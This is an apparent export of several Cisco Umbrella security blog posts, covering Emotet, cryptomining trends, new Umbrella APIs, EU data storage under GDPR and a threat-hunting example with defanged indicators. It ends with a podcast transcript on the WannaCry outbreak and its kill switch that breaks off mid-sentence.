The emails appeared to be sending recipients a holiday gift card — but instead, they included links that would download malicious word documents.\nA year later, the Emotet malspam trojan remains one of the most active malware families. Development has continued on the malware with new features and modules still being added.\nWhat is Emotet malspam trojan?\nEmotet is a trojan that is typically spread through spam emails. The trojan module is capable of loading and installing additional malware, stealing online credentials and personal sensitive information. The bypass component enumerates network resources looking for servers — for each one it finds, it will try to bruteforce the administrator and user accounts. This lets the malware spread via default admin shares and shared folders using SMB to establish persistence. Additional data gathering capabilities include, but are not limited to, email exfiltration, collecting sender and destination names from the interpersonal message (IPM) root folder, harvesting emails that have been sent or received within the last 180 days. This method of harvesting data en-mass allows for a weaponized and data-driven analytical capability that increases the effectiveness and spread of the Emotet trojan. We observed the following secondary payloads: TrickBot, IcedID, QuakBot, AzoRult, Ursnif/Gootkit, and Zeus Panda Banker Trojans.\nHow can Umbrella help?\nMalspam campaigns are highly automated and able to generate up to 500 weaponized documents hosted on compromised domains daily. Our internal security research team developed a Malspam classifier to automatically block Malspam campaigns. These blocks of the compromised domains hosting weaponized documents are derived from multiple sources including open-source intelligence (OSINT), infrastructure telemetry hunting algorithms, partner relationships and Umbrella’s research on co-occurrences and related domain models. Intelligence typically includes indicators gathered from malware, IPs, domains, campaign research and threat actor developments. When Emotet is detected, Cisco Umbrella will block at the IP and domain level, as well as analyze risky domains using a selective proxy.\nHow we gather threat intelligence for Umbrella\nThere are three key factors that make up our unparalleled threat intelligence: data, security researchers, and statistical and machine learning models. Umbrella resolves over 175 billion DNS requests daily, far more than any other security vendor, giving our researchers a unique view of the internet. This view allows us to quickly and effectively identify threat trends. Our industry renowned researchers are constantly finding new ways to uncover fingerprints that attackers leave behind by building new statistical and machine learning models. These models automatically classify our massive amounts of data.\nIf you’d like to take advantage of our threat intelligence and protect your organization against threats such as Emotet, try Umbrella for free.', 'Security Research;Threat Discovery;Umbrella', 'https://umbrella.cisco.com/blog/2019/03/08/emotet-malspam-trojan-the-gift-that-keeps-on-giving/');

Now there is an emerging threat on the scene, and it’s taking over like wildfire: malicious cryptomining. This browser-or software-based threat enables bad actors to hijack system resources to generate cryptocurrencies for nefarious purposes.\nThe market volatility of cryptocurrency makes this emerging threat typically much more financially lucrative than ransomware. Cyber thieves are drawn to cryptomining as it is an easy way for them to generate cash and attack even more people while remaining anonymous.\nNew findings from Cisco Umbrella research shows that in the last nine months there has been a 19x increase in cryptomining activity on the internet. Umbrella protects users from connecting to malicious sites on the internet and analyzes over 175 billion DNS requests daily. The sheer volume of DNS requests gives our researchers a unique view of the internet to better identify trends on threats, faster.\nCryptomining research highlights:\n19x increase in cryptomining related traffic in the last 9 months of 2018.\nTop verticals impacted: energy, education, healthcare, local government and media. No industry is safe. Distribution of crypto traffic is spread across all industries.\nNorth American and European countries have heavy malicious cryptomining traffic.\nEnvironments with 10,000 employees or less are hit the hardest.\nExplosive growth\nIn 2018, malicious cryptomining consistently ranked as one of the top threats across all internet activity. No other threat has witnessed such massive growth. Total cryptomining activity grew from approximately 600k queries in March 2018 to 11.3 million queries as of December 2018. That is a 19x increase in cryptomining activity across our 90 million Umbrella users.\nWhy should you care?\nCryptomining in your environment means you are vulnerable. While browser-based cryptomining can be concerning if it is happening routinely and profusely, you should always be on the lookout for bad actors installing malicious cryptomining software in your network. Why? It’s simply a starting point. Attackers can leverage their presence in your network to execute future attacks. Malicious cryptomining also represents a hidden cost to your organization. Stolen computing resources impacts your electricity costs, Amazon Web Services (AWS) computing costs, and your bottom line.\nEnergy industry most at risk\nLooking at our corporate Umbrella traffic, in particular, we see that about one third of all cryptomining activity is attributed to energy and utilities organizations. Energy organizations may be hot targets due to their likeliness to use outdated systems and software that are more prone to vulnerabilities. Colleges and universities come in at second place with 22 percent of total cryptomining activity across verticals.\nDistribution of cryptomining traffic across verticals:\nNorth America is a key target\nTraffic from our corporate users reveals that the majority of cryptomining activity is being targeted at North America. The U.S. accounts for 62 percent of the total cryptomining traffic, followed by EMEA, which accounts for 6 percent of the total. The remaining traffic is distributed across the globe.\nVolume of cryptomining traffic by country:\nSize doesn’t matter\nUnwanted cryptomining is non-discriminatory. Our research shows that malicious cryptomining is highly prevalent everywhere – across all organization sizes, and industries. No one is safe. All organizations need to take action to protect their resources from malicious cryptomining. Smaller organizations, with less mature cyber security teams, are not exempt. They are also being targeted heavily. In fact, the majority of cryptomining traffic we see is impacting organizations with under 10,000 employees.\nDistribution of cryptomining traffic across organization sizes:\n\nResearchers advise that there is no foreseeable sign of illicit cryptomining slowing down in the coming years. Cryptomining will continue to grow rapidly. So, why wait to get protected?\nHow can Cisco Umbrella help?\nUmbrella is a cloud security platform that protects users from connecting to malicious sites on the internet. By analyzing and learning from internet activity patterns, Umbrella automatically uncovers current and emerging threats, and proactively blocks malicious requests before they reach your network or endpoints.\nUmbrella customers can detect, block and protect against unwanted cryptomining in their environments by simply enabling the cryptomining security category in their policy settings.\n\nOnce the cryptomining security category is selected, you can also view cryptomining activity right from the Umbrella dashboard alongside other common threat categories such as malware, phishing and command and control.\n\nThe ability to detect and block cryptomining is available as standard for all Umbrella customers.

But sometimes delivering a great user experience has nothing to do with Umbrella itself, but how we can build Umbrella to work with our customers own tools and workflows. That’s where APIs come in. Today, we have APIs that do some pretty amazing things, such as add more value to existing products and make the deployment of Umbrella across a Meraki network even easier. In the future, we want to extend the capabilities of Umbrella even further — by allowing our customers to do anything they currently do in our product via API. We’re excited to announce two new APIs that bring us closer to that goal — the reporting API and management API.\nReporting API\nWhen investigating suspicious domains, time is of the essence. Analysts need to be able to gather information fast— and accessing it needs to be easy. Analysts need to be able to effectively filter through massive amounts of data and identify the relevant security events. But this is often difficult to do since only a minute portion of all events are related to a security event.\nThe new reporting API enables security teams to quickly extract key events from Umbrella and easily access the events via their SIEM, TIP or any other security orchestration tool. The API significantly improves search for risky domains by allowing analysts to view Umbrella events and queries tied to known malicious and suspicious domains, as well as relevant data from other security tools all on a single pane of glass.\nIn addition, the API allows analysts to be able to easily evaluate the level of exposure to a malicious or suspicious domain by reviewing a snapshot of key details such as total volume of DNS resolutions for the domain and the specific users affected within their network.\nCustomers can also use the reporting API to integrate their Umbrella data with other threat intelligence in Cisco Threat Response. The reporting API is now available for customers with any Cisco Umbrella enterprise package.\nManagement API\nWe developed the management API to provide direct customers, multi-org users, SPs, MSPs, and MSSPs with the ability to manage Umbrella at scale. The new management API enables customers to automate processes and aggregate customer data and management. Administrators can easily complete tasks such as creating, reading, updating, or deleting identities using their own internal tools.\nWhat does this look like in the real world?\nSuper Secure, Inc. is a (fictitious) MSSP with (real) challenges — they needed a streamlined way to manage Umbrella that fit into their unique workflows. With the management API, they can complete a number of tasks quickly and easily using a single pane of glass approach. Let’s look at an example:\nNew customer provisioned by the Super Secure, Inc. via API.\nInternal script is able to check that all customers are sending traffic.\nA new router is provisioned that doesn’t point DNS to Umbrella.\nMSSP is notified immediately within their internal tool and remediates.\nThis is just one example. We’re looking forward to the many ways customers will take advantage of the API. To learn more about configuring the management API, read the technical documentation.\nStay tuned for more updates around our API journey next month.\nResources\nUmbrella APIs overview\nReporting API – technical documentation\nManagement API – technical documentation', 'Announcements;News;Product Release;Security Tools', 'https://umbrella.cisco.com/blog/2018/10/09/reporting-api-management-api/');

Deutsche Übersetzung unten. (Speak German? German version below.)\nData privacy and how it impacts your company is likely top of your mind no matter where you are located. For EU companies, however, protecting customer data is now rule of law, and even your security solutions will need to comply with those rules.\nMany security vendors store customer data in long-term activity logs for important reporting functions. This data often provides key information to help customers secure their networks and users. Why does this matter?\nWith European Union (EU) data sovereignty laws, including the new General Data Protection Regulation (or GDPR) regulations, storing EU-citizen data in a US-based data center can complicate things for EU companies and for US companies doing business in the EU.\nCisco is addressing these concerns and we’re pleased to announce a new EU data warehouse for Cisco Umbrella data storage. You can now select to store your Umbrella log data in the EU or in the US.\nNow, let’s explore five common questions about data storage, particularly data storage in the EU.\n\nWhy do security vendors even need to store customers’ data?\nVendors primarily store data on the customer’s behalf so that their reporting functions can pull from this data and provide important historical information.  This makes it possible for you to spot trends and anomalies. This becomes especially important when you are dealing with cybersecurity.  Trends and anomalies in security data can indicate security breaches.\n\nWhy is it important to be able to store your data in the EU?\nBecause of various regulations for EU data sovereignty and data locality, customers in the EU are very interested in where their data is stored.  GDPR has raised awareness further.  Knowing that their data can be stored in the EU can simplify the process for the company’s privacy officer.  Data stored properly in the US data warehouse can still meet EU compliance requirements but may require the company’s privacy officer to apply more scrutiny, making the process more difficult.\n\nWhat is GDPR and who does it affect?\nThe EU GDPR went into effect on May 25, 2018, and applies to all organizations that process EU personal data. Aimed at protecting the fundamental right to privacy, the new regulations are broad, strict, and require adherence from organizations all over the world.\n\nCan a product make an organization GDPR compliant?\nNo single product will make an organization GDPR compliant. GDPR is the legislative embodiment of privacy best practices and calls for transparency, fairness, and accountability when processing personal data. GDPR pushes the concepts of Privacy by Design and by Default: privacy and data protection have to be built-in and integrated in all data processing activities performed by the entity (the data controller) or by external organizations on its behalf (the data processor). This is about respecting individual rights, secure processes, and risk management. Well-applied technology solutions can help underpin success. For example, Cisco Umbrella can help customers raise their security levels by blocking suspicious domains that might be compromised.\n\nDoes personal data need to remain in the EU?\nNo. People often assume that the EU GDPR requires data localization and that personal data must remain in the EU. GDPR provides that EU personal data should be processed in the EU, unless you have approved mechanisms that allow for the international transfer of data. For example, Cisco has certified compliance with the EU-US and Swiss-US Privacy Shield, which commits Cisco to a set of privacy principles and practices aligned to EU law when processing EU personal data in the US. The Shield framework has been deemed “adequate” by the European Commission – meaning EU personal data can flow to Shield-certified companies.\nNow that we’ve walked through the answers to these common questions on data privacy and storage, let’s take a look at how Cisco Umbrella can help you maintain compliance with GDPR, while protecting against threats on the internet.\nHow does Cisco Umbrella help with EU data privacy?\nCisco Umbrella provides the first line of defense against threats on the internet, wherever your users go – on or off the network.  Umbrella uses DNS to stop threats over all ports and protocols — even direct-to-IP connections so you can stop malware before it reaches your endpoints or network.\nAnd yes, Umbrella stores important data so that you can see historical trends and keep your network secure. But, the new EU data warehouse for Cisco Umbrella log storage promises to make your life a little less complicated and enhance your data privacy. With Umbrella, you have one less thing to worry about.\nIf you’re interested in learning more about Cisco Umbrella privacy, go here.\nLearn more about Cisco Umbrella here.\nFünf Fragen zum Datenschutz in der EU\nNeues EU Data Warehouse für Cisco Umbrella-Datenspeicherung\nDer Datenschutz und dessen Auswirkungen auf Ihr Unternehmen stehen wahrscheinlich weit oben auf Ihrer Prioritätenliste, egal wo Ihr Standort sich befindet. Für Unternehmen in der EU bestehen inzwischen ganz besondere Anforderungen an den Schutz von Kundendaten. Diese neuen Regeln werden sich auch auf die verwendeten Sicherheitslösungen auswirken.\nViele Security-Anbieter speichern Kundendaten in langfristigen Aktivitätsprotokollen, die für wichtige Berichterstellungsfunktionen verwendet werden. Diese Daten enthalten häufig wichtige Informationen, die Kunden dabei helfen, ihre Netzwerke und Benutzer zu schützen. Warum ist das wichtig?\nAufgrund der EU-Datenschutzgesetze einschließlich der Regelungen der neuen Datenschutzgrundverordnung (DSGVO) kann die Speicherung der Daten von EU-Bürgern in einem Rechenzentrum in den USA für EU-Unternehmen und auch für US-Unternehmen mit geschäftlichen Aktivitäten in der EU zu Problemen führen.\nMit unserem neuen EU Data Warehouse für die Datenspeicherung in Cisco Umbrella gehen wir auf diese neuen Anforderungen ein. Jetzt können Sie wählen, ob Ihre Umbrella-Protokolldaten in der EU oder in den USA gespeichert werden sollen.\nIm Folgenden beantworten wir die fünf häufigsten Fragen zur Datenspeicherung, insbesondere zur Datenspeicherung in der EU.\nWarum müssen Security-Anbieter überhaupt Kundendaten speichern?\nAnbieter speichern Daten in erster Linie im Namen des Kunden, damit ihre Berichterstellungsfunktionen auf diese Daten zugreifen und wichtige Verlaufsinformationen liefern können. Anhand dieser Daten haben Sie die Möglichkeit, Trends und Anomalien zu erkennen. Dies ist für Sie besonders im Zusammenhang mit Cybersicherheit wichtig. Trends und Anomalien in Security-Daten können Hinweise auf Sicherheitsverletzungen geben.\nWarum ist es wichtig, diese Daten innerhalb der EU speichern zu können?\nAufgrund der verschiedenen in der EU geltenden Bestimmungen zum Datenschutz und bezüglich des Aufbewahrungsorts von Daten sind EU-Kunden sehr daran interessiert, wo ihre Daten gespeichert werden. Die DSGVO hat dieses Bewusstsein zusätzlich verstärkt. Das Wissen, dass ihre Daten in der EU gespeichert werden können, kann den Vorgang für Datenschutzbeauftragte eines Unternehmens vereinfachen. Eine ordnungsgemäße Speicherung von Daten in einem Rechenzentrum in den USA kann zwar weiterhin die EU-Compliance-Anforderungen erfüllen, aber der Datenschutzbeauftragte eines Unternehmens muss in diesem Fall evtl. zusätzliche Kontrollen einsetzen, was den Prozess verkompliziert.\nWas ist die DSGVO, und wer ist davon betroffen?\nDie EU-DSGVO trat am 25. Mai 2018 in Kraft und gilt für alle Organisationen, die personenbezogene Daten von EU-Bürgern verarbeiten. Die neuen Vorschriften sollen das Grundrecht auf Privatsphäre schützen. Zu diesem Zweck sind sie weit gefasst, streng und bindend für Organisationen weltweit.\nGibt es ein Produkt, mit dem eine Organisation DSGVO-Konformität erreichen kann?\nEs gibt kein Einzelprodukt, durch dessen Implementierung eine Organisation DSGVO-Konformität erreichen kann. Die DSGVO ist die gesetzliche Festschreibung von Datenschutz-Best-Practices und verlangt Transparenz, Fairness sowie Zurechenbarkeit bei der Verarbeitung personenbezogener Daten. Die DSGVO fordert die Umsetzung der Konzepte „Datenschutz durch Technikgestaltung“ (Privacy by Design) und „Datenschutz durch datenschutzfreundliche Voreinstellungen“ (Privacy by Default): Datenschutz muss von Grund auf in sämtliche Datenverarbeitungsaktivitäten integriert werden, die von der natürlichen oder juristischen Person (dem Verantwortlichen) durchgeführt werden oder von externen Organisationen (Auftragsverarbeiter) im Namen dieser Person. Ziele sind die Durchsetzung von Individualrechten, sichere Prozesse und ein erfolgreiches Risikomanagement. Korrekt implementierte Technologielösungen können die Grundlage für eine erfolgreiche Umsetzung sein. Mit Cisco Umbrella können Kunden beispielsweise verdächtige, möglicherweise kompromittierte Domänen blockieren und so das Sicherheitsniveau ihres Unternehmens steigern.\nMüssen personenbezogene Daten in der EU bleiben?\nNein. Oft wird angenommen, dass die EU-DSGVO eine Standortbindung der Daten und den Verbleib personenbezogener Daten in der EU verlangt. Die DSGVO schreibt vor, dass personenbezogene Daten von EU-Bürgern in der EU verarbeitet werden müssen, es sei denn, ein Unternehmen verwendet zulässige Mechanismen, die eine internationale Übermittlung von Daten ermöglichen. Beispiel: Cisco ist nach dem EU-US-Datenschutzschild und dem Schweiz-US-Datenschutzschild zertifiziert. Im Rahmen dieser Vereinbarung ist Cisco verpflichtet, den EU-Gesetzen entsprechende Datenschutzgrundsätze und -verfahren einzuhalten, wenn in den USA personenbezogene Daten von EU-Bürgern verarbeitet werden. Der Schutzschild wurde von der Europäischen Kommission als „angemessen“ eingestuft. Personenbezogene Daten von EU-Bürgern dürfen also an nach dem Schutzschild zertifizierte Unternehmen übermittelt werden.\nSie kennen nun die Antworten auf diese häufig gestellten Fragen zum Thema Datenschutz und Datenspeicherung. Im Folgenden erfahren Sie, wie Cisco Umbrella Sie bei der Einhaltung der DSGVO unterstützt und gleichzeitig Schutz vor Bedrohungen aus dem Internet liefert.\nWie hilft Ihnen Cisco Umbrella in puncto EU-Datenschutz?\nCisco Umbrella bietet die erste Verteidigungslinie gegen Bedrohungen aus dem Internet, unabhängig davon, ob sich Ihre Benutzer innerhalb oder außerhalb des Unternehmensnetzwerks befinden. Umbrella nutzt DNS und bietet damit Bedrohungsschutz für alle Ports und Protokolle – selbst für direkte IP-Verbindungen. So stoppen Sie Malware, bevor diese Ihre Endpunkte erreicht oder in Ihr Netzwerk eindringt.\nJa, Umbrella speichert wichtige Daten, damit Sie Trends verfolgen und die Sicherheit Ihres Netzwerks gewährleisten können. Das neue EU-Rechenzentrum zur Speicherung von Cisco Umbrella-Protokolldaten ermöglicht dabei eine unkomplizierte Speicherung und verbessert zudem Ihren Datenschutz. Mit Umbrella haben Sie also eine Sorge weniger.\nWeitere Informationen zu Cisco Umbrella und zum Thema Datenschutz finden Sie hier.\nWeitere Informationen zu Cisco Umbrella finden Sie hier.', 'Announcements;Product Release;Umbrella', 'https://umbrella.cisco.com/blog/2018/10/04/five-questions-ask-data-privacy-eu/');

With many free automated malware analysis and sandbox environments available, the barrier for threat analysis has been lowered. Though these products are excellent tools in the effort to combat malware, and while educating more users to take steps for their own security is always encouraged, the fact is that sometimes malicious artifacts can escape conviction. These type of products allow the upload of files and URLs and rely on a series of techniques and systems to evaluate the uploaded content. The techniques that these environments use vary, and may produce unexpected results while submitting things that are known to be malicious. One way to counteract this, is for users to work with the most discrete information available to them, the smallest thing they would like to evaluate, and go from there. This blog post will outline a scenario showing how isolating aspects of a malicious webpage for analysis led us down an exciting path of threat hunting.\nLowest Common Denominator\nOur home-brewed NLP rank  automates the detection and blocking of phishing domains very efficiently, based on the threshold we set during its training. However, some of the results wind up below our target score and Analysts get to do some manual analysis work. Usually this is due to a change in tactics, procedures, or code by the actors. One recent trend in crypto phishing is not just aiming at stealing users’ credentials but also infecting them with different Trojans.\nOne example is a now removed site, idex[.]store. Posing as a cryptocurrency exchange, this domain when analyzed on VirusTotal at the time, displayed as benign.\nidex[.]store’s now removed page.\nThough the end of the page’s code contains a Visual Basic script designed to be a dropper…\nidex[.]store VB script\nVirusTotal did not convict the URL:\nVirusTotal fails to detect maliciousness.\nHowever when the VB script is run in isolation, VirusTotal returns a much different result:\nVB script analyzed in isolation.\nWhen working with a sandbox environment that has more granularity or features such as Threatgrid, this isolating strategy can become very powerful. Here we can see that Threatgrid has more information to reveal about the script, and that other anti-virus services have labeled this as a dropper at least, or Ramnit at worst:\nTheatgrid Analysis of VB script\nNow that we have more concrete evidence of maliciousness, we can begin to pivot as we normally would, finding further malicious domains. The IP addresses that idex[.]store last resolved to, and the one that it resolved to while it was still hosting the dropper are both leads to follow.\nidex[.]store’s observed IP addresses\nA second example found while pivoting from this IP address is a domain posing as electrum[.]org. This domain tries to trick users by providing download links to electrum wallets:\nMalicious domain posing as electrum wallet download site\nBinaries which are hosted at those links are trojanized and will steal and send user credentials to a malicious actor. They are recognized as malicious by both VirusTotal and Hybrid Analysis:\nAnalysis of the binary downloaded from electrumwallet[.]ml\nAnalysis of the binary downloaded from electrumwallet[.]ml\nThe Rabbit Hole\nThe first IP address, the one that idex[.]store originally used was 178.208[.]83.11. Only utilized for about a day, this IP address belongs to mchost[.]ru, a popular internet registrar and domain hosting service based in Russia. On this IP address are several other domains of various degrees of maliciousness, including several typo-squatting phishes of Bitfinex and Cryptojacking.\n\n\n\nThe new IP addresses, 109.70.26[.]37 and 194.85.61[.]76 seem to be shared by a host of malicious domains. In addition to a typo squat of Vodafone and several obvious Apple phishes, there is a record of droppers and trojans calling back to their IPs as well as a history of spam-filled advertising networks.\n\n\nThe cherry on this malicious cake includes Emotet hosts like this one.\n\n\n\nGiven the nature of threat hunting, there could always be dead ends and failures.

Hit subscribe and give us a review on iTunes or SoundCloud or Google Play, or wherever it is you go to get our voice into your ears. Now, onto the episode. Take it away, Mike.\nMike Storm: Last season the Root Access team covered ransomware. At the time, it had gone from an attack novelty to a full-blown security epidemic. Last May, the entire ransomware game changed for the worst.\nSpeaker 3: I’d like to talk to you today about a cyber issue of significance in May of this year. A dangerous cyberattack known as WannaCry spread rapidly and indiscriminately across the world. The malware encrypted and rendered useless hundreds of thousands of computers in hospitals, schools, businesses, and homes in over 150 countries. While victims received ransom demands, paying those demands did not unlock their computers. This was a careless and reckless attack. It affected individuals, industry, governments, and the consequences were beyond economic.\nMike Storm: In this episode of Root Access, we’re going to revisit two of the largest ransomware attacks just before their anniversary. We’ll examine what we’ve learned, what we need to work on, and where hackers might be going next. In May of 2017, an unprecedented malware attack spread worldwide in a matter of hours. It caught the entire security community, not to mention its victims, completely off-guard. Around noon on May 12th, Ars Technica first reported that a ransomware attack had been observed by numerous security researchers and was spreading quickly, infecting 75,000 computers in more than 70 countries. No one knew exactly how it was spreading or who was behind it yet, but it was clear that whoever it was meant business. By the time the attack was stopped about a day later, the number of infected machines had reached 300,000 in more than 150 countries.\nCraig Williams: You know, when this first happened, people panicked. A lot of companies came out and said it was actually spreading over email. At the end of the day, it couldn’t have been further from the truth. WannaCry was actually the world’s first ransomware worm that was spreading using the EternalBlue vulnerability. This was one of those worms that was not trying to spread in a hidden manner. It was spreading across the internet, and laterally within networks as loudly and as fast as it could. It’s kind of a catch-22, because on one hand attackers wanted to spread quickly so they could monetize it, but on the other hand it gets security researchers and law enforcements attention immediately.\nMike Storm: This is Craig Williams. He’s a senior technical leader and outreach manager for Cisco Talos. You might remember him talking about hacker screw-ups in Root Access season one. We had the chance to sit down with Craig again to talk about the WannaCry event. Talos was one of the first teams to discover this attack and nail down the attack vectors as the global spread intensified. WannaCry had multiple moving pieces that made it one of the most fascinating and significant events the world has ever seen. From the makeup of the ransomware to the targets it hit, even the exploit it used, even the way that the attack was eventually stopped, this is a cyber security case study for the ages.\nYou heard Craig mention two important points. They are a major part of why this attack was so important, and why it’s the focus for this episode. The first important point is that WannaCry was a worm. Worms have been in existence since the Morris worm back in the 80’s. This event had a worm-like spread with a ransomware component, which makes it unique and really damaging. Not only was it self-propagating, but it required no user interaction to infect and spread, but we’ll get to that in a little bit.\nThe other word Craig mentioned was the name EternalBlue. The EternalBlue exploit, along with a large collection of other zero day tools was stolen and then leaked to the public by a group called Shadow Brokers. That group could be an entire episode on its own. This entire topic in fact, could spark a lengthy and circular ethical debate about whether or not the US government is responsible, or whether Shadow Brokers are responsible, or whether system administrators are responsible for not patching. It’s not our place to hash these things out. The fact is, a taster’s choice collection of exploits did get out into the wild, and hackers immediately started using them because they work, especially EternalBlue. One former NSA agent spoke to the Washington Post and described it as “fishing with dynamite.” It was an absolute sure thing. Well, early versions apparently caused some Windows installs to blue screen, but they fixed that, and then, it became a sure thing.\nLet’s talk about how this thing works. EternalBlue uses a flaw in a protocol known as SMB. I’m sure you’re familiar with it, since it’s been around since 1990 or so. Just in case you’re not, SMB stands for Server Message Block. It’s a network protocol that operates over TCP port 445 and a few others, and it’s used mostly for remotely controlling printers, file sharing, and communicating between server nodes. These are the type of operations that you do not want to be open to the public internet obviously. The general sentiment is to not leave port 445 or any other SMB port open, but of course, people still do it.\nEternalBlue establishes a sort of foothold by exploiting the open 445 port. A second shadow broker’s exploit called DoublePulsar creates a functional backdoor. The malware then runs and encrypts pretty much any useful file on the machine and pops up the infamous ransomware screen demanding a bitcoin payment. Nothing so far makes this form of ransomware unique, with exception of the exploits used and where those exploits come from.\nWhat makes WannaCry unique comes after a host is compromised. Once the malware payload is dropped and the backdoor is open, a service searches for removable storage devices and any mapped network drives. It also scans the entire IP subnet for open 445 ports, and then uses the same exploits to gain access and encrypt the files of every computer it can get to on the same network. This was the big differentiator. It’s how the worm spread from tens of thousands to hundreds of thousands of computers in just hours.\nSpeaker 5: It looked at first like an attack just on hospitals in the UK, but it’s now becoming clear that this malicious software has run riot around the world. Russia, the United States, and many points in between have been hit by what’s now a common form of cyber crime.\nSpeaker 6: Ransomware has become a tool of choice for an awful lot of criminals, simply because it’s very, very easy to make money very quickly. You can buy ransomware online.\nSpeaker 7: Here in the UK, hospitals have been badly hit, including this one in Central London. Since Friday, it’s been struggling to get back online.\nSpeaker 8:                    The hospital told Ken Robbins his cancer surgery was delayed.\nKen Robbins:                They phoned me up this morning and said it’s too important to have my operation. Coming straightaway and they’re going to do it.\nSpeaker 10:                  What is your message to the hackers who have created this ransomware?\nKen Robbins:                To put it bluntly, [expletive]. They need to go to prison for 20 years. They don’t realize what impact they’re having on patients.\nMike Storm:                 My guess is the actors behind WannaCry were aware of the damaging effect they were having, and according to Craig, it didn’t appear that the point of this ransomware attack was to make money.\nCraig Williams:             I don’t think it was nearly as lucrative as it could have been, because they didn’t really have a good way to associate victims with ransom payments. Now, eventually people did start hearing about payments actually being made and victims getting their computers back, but the problem was, they combined the fastest spreading mechanism, a worm like behavior and then they had a manual payment verification system. So, it’s like having a F1 engine in a car that has a transmission with two gears, it just doesn’t work. So, people thought it was fake. My personal opinion is that it was not really designed to make money, it was designed to just damage and hold systems hostage.\nMike Storm:                 It’s easy to dismiss an attack that demands a mere 300 bucks and doesn’t have a good way of verifying payments. It won’t exactly rake in the dough. You heard Craig say the business model was pretty flawed compared to other ransomware attacks that made millions. Estimates for this event are in the low hundred thousand range, but the ransom aspect was not the danger here. This event was deadly serious for its interruptive impact on critical systems. 61 hospitals in the UK were hit. A surgeon remarked that he was unable to look at vital CT scans for a patient who was in need of an urgent neurosurgery.\nWith medical systems down, doctors and nurses could not process patients. There were reports of ambulances being turned away from hospitals while these systems were down. Universities and ATMs in China were hit, fuel pumps in Singapore, even one of the largest Telecom companies in Spain, and FedEx was hit here in the States. A hospital in 10 different schools in Taiwan were all hit. We had a car manufacturing facility in France that had to stop production entirely because of the event. Hours after the initial hits on the British National Health System, the control systems and timetables at Deutsche Bahn, Germany’s largest train service, were hit and service was interrupted.\nSpeaker 11:                  [Recording of news announcement in German]\nMike Storm: Petrobras, the state-owned petroleum company in Brazil, even their national social security system, the Foreign Ministry and court systems were all hit there. This was all done automatically in a self-perpetuating, self-propagating manner within about a 48 hour period. No tricky email attachments or elaborate phishing sites were required. The real kicker was that the majority of victims could have avoided this attack on three fronts, first, by making sure port 445 on network computers was not left open to the Internet, second, Microsoft had actually issued a patch for the exploit months before the event for all Windows versions except for Windows XP, and to be honest, if you’re a Sysadmin or IT director working in an organization that still uses XP, you need to find a new job. Thirdly…\nCraig Williams: Get a backup. Use the backup. Verify that your backup’s working. I can guarantee you that every single person will have a hard drive that fails. All hard drives fail. If you don’t have a backup of that hard drive, you’re going to lose that data anyway. So spend the money that you would have paid on the ransom and just buy a hard drive, it’s like 50 bucks on Amazon, they’ll ship it to you the next day. Now, the most important part though, is making sure that your backup actually works, that’s the step that most people forget.\nMike Storm:                 Now is where we get to the really interesting parts of this story, namely the kill switch that stopped the attack, and the trojan that is potentially even more dangerous than WannaCry.\nSpeaker 13:                  The hearing today was to determine whether or not Marcus would be detained as a result of the charges and the indictment. The judge agreed with me and saying that he was going to be released, pending certain conditions that he has attached to the bond and that he has to post a $30,000 cash bond, and that’s coming from a variety of sources. He has tremendous community support, local and abroad, and in the computer world. So, many people are trying to put money together and raise the amount for the bond.\nMike Storm:                 During WannaCry’s global spread, security and threat intelligence researchers were frantically trying to get an understanding of how the malware worked. One such researcher, a 23 year old who lives in the UK and works for the security firm Kryptos Logic, was examining the malware and found a rather odd domain that the malware called out to during its course of unpacking itself and encrypting the files. It’s purpose was unknown, but it turned out to be pretty critical. Here’s Craig again.\nCraig Williams:             WannaCry did a lot of really weird stuff. If I had to nail down the one unique feature, it was that it was the world’s first ransomware worm. It also had a lot of other really, really weird things going on. The first one, I think was that the fact that it was fairly buggy, the real first version of WannaCry actually had a broken scanning algorithm. When we first saw it, we actually were wondering if it was using a favoritism algorithm to target certain countries more than others, but it turned out that wasn’t the case, it was just using uninitialized stack variables sometimes, so the scan would just fail right away. Yeah, the other really weird part was this kill switch. Have you heard of that one? Yeah, I’ve never seen anything like that. I can’t think of any logical reason to have that in your malware. It’s just the most bizarre thing. At a really high level, what the kill switch allowed someone to do was remotely shut off the worm from a global perspective.\nI don’t know why a malware author would want that. It would effectively be like having a car and having someone blink a light at it a certain way and the car turns off. Why would they do that? Some people guess that it was designed to help avoid sandboxes. I don’t think that makes sense. The way the kill switch worked doesn’t seem like something a sandbox would fail. Effectively, what it did was it tried to look up this really long alphanumeric domain, it looks super sketchy, of course Umbrella saw it, and Umbrella immediately flagged it as a malware C2, because it saw so many people trying to look up this non-existent domain.\nSo, what happened was, if the domain lookup worked, have they got a domain? Have they got a server? The worm would shut off. I think it was just a really poorly thought-out way to avoid sandboxes. I don’t know of a sandbox that operates like that. I was giving a talk at Cisco Live Cancun, and one of the audience members said they were aware of a sandbox that actually would fake look ups, but they couldn’t remember the name. So, there might be one out there, but it’s certainly not popular and I can’t think of a good reason, but that’s the best thing I can think of.\nMike Storm: So, out of curiosity, this young researcher, Marcus, not knowing what the domain written into the malware is for, decides to register the domain for ten bucks, unbeknownst to him, as you heard Craig describe, this essentially killed the malware’s ability to spread. Since the malware was calling this domain as it was going through it’s infection and encryption process, once it started connecting successfully, it would halt itself. That $10 proved to be a pretty hefty price tag for Marcus, unfortunately.\nMarcus Hutchins: I’ve had people inundating me with messages just thanking me, saying that I’m a hero. I just registered this domain for tracking and I didn’t intend for it to blow up, and me to be all over the media. I was just doing my job and I don’t really think that I’m a hero at all. I’ve still been working of course for my company Kryptos Logic. We’ve been trying to provide the IP addresses to NCSC, the FBI, so that victims can be notified. I’ve been having queries from around the world, obviously journalists inundating me with queries. We’re just pretty much business as usual, except I have not had any sleep in three days. My lovely bosses offered me an all expenses paid vacation to Las Vegas and to Los Angeles as well, so I’m gonna head out on maybe next week, in a week’s time, I’m gonna chill out there for a bit, and then come back to work. My name is out in the papers, so my general location is, so I don’t think I’m ever going back to being the malware tech that no one knew.\nMike Storm: Rather than the malware authors retaliating against Marcus for him shutting down their campaign, it ended up being the tabloid media in the UK that doxxed him. A couple days after his work examining the WannaCry malware, Marcus woke up and checked the news, there he saw his face on the front page of a major UK news outlet. According to his own account of the events on his Twitter account, malware tech blog, by day two, he was hopping over his back fence to avoid reporters who had camped outside his house. Other reporters even attempted to get to him through friends and even an ex-girlfriend. He said one of the largest UK newspapers published a picture of his house along with the full address. From there, his celebrity only increased. The bug bounty firm HackerOne gave Marcus a $10,000 bounty reward that he ended up donating to charity. Then, he received a paid vacation to the DEF CON security conference in Vegas, and that’s where things turned sour for him.\nSpeaker 15: The man who stopped the WannaCry cyber attack was just arrested for creating a 